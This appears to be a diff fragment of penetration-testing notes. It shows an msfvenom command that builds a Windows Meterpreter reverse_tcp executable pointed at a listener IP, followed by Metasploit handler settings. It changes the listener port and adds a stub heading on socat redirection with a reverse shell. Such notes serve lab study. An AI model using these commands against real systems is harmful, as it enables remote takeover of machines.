@@ -375,11 +375,17 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o bac
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
 set lhost 0.0.0.0
-set lport 8080
+set lport 8081
 run
 ```
 
+- Activate the shell on the rdp session
+
 -----------------
+
+### Socat redirection with a reverse shell
+
+----------------
 
 
 
